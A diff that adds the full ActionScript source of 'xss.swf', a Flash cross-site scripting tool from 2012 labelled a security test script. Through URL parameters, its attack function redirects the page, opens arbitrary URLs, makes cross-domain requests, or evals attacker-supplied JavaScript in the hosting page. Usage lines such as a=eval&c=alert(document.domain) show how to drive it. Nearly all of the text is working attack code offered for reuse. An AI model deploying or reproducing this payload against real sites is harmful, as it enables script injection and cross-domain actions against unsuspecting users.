@@ -11,5 +11,68 @@ a(action) - c(cmd)
 3. http request to url: xss.swf?a=get&c=http://www.google.com/
 4. eval js codz: xss.swf?a=eval&c=alert(document.domain)
 
+source
+-----------------
+/*
+evilcos@gmail.com
+2012/6/9
+xss - flash security test script.
+ref: fly_flash
+*/
+
+import flash.net.*;
+import flash.events.SecurityErrorEvent;
+
+var param:Object = root.loaderInfo.parameters;
+var action:String = param["a"];
+var cmd:String = param["c"];
+
+function attack(action)
+{
+	switch (action)
+	{
+		case "location" :// location URL
+			navigateToURL(new URLRequest(cmd),"_self");
+			break;
+		case "open" :// open URL
+			navigateToURL(new URLRequest(cmd),"_blank");
+			break;
+		case "get" :// GET
+			var loader:URLLoader = new URLLoader(new URLRequest(cmd));
+			loader.addEventListener(Event.COMPLETE,get_complete);
+			loader.addEventListener(SecurityErrorEvent.SECURITY_ERROR,get_sec_error);
+			break;
+		case "eval" :// execute JS
+			flash.external.ExternalInterface.call("eval", cmd);
+			break;
+		default :
+			var help:String = 'a(action) - c(cmd)\n';
+			help +=  '-----------------\n';
+			help +=  '1. location to url: xss.swf?a=location&c=http://www.google.com/\n';
+			help +=  '2. open url to new window: xss.swf?a=open&c=http://www.google.com/\n';
+			help +=  '3. http request to url: xss.swf?a=get&c=http://www.google.com/\n';
+			help +=  '4. eval js codz: xss.swf?a=eval&c=alert(document.domain)\n';
+			help +=  '-----------------\n';
+			help +=  'by evilcos@gmail.com';
+			flash.external.ExternalInterface.call("alert", help);
+			break;
+	}
+	stop();
+}
+
+function get_complete(event:Event)
+{
+	flash.external.ExternalInterface.call("alert", 'corss domain request ok.');
+	// __flash__toXML(alert("")) may be error.;
+	//var d:String = String(event.target.data);
+	//flash.external.ExternalInterface.call("alert", d);
+}
+function get_sec_error(event:SecurityErrorEvent)
+{
+	flash.external.ExternalInterface.call("alert", '[security error:]\n/crossdomain.xml\ncross domain request is not allowed.');
+}
+
+attack(action);
+
 -----------------
 by evilcos@gmail.com
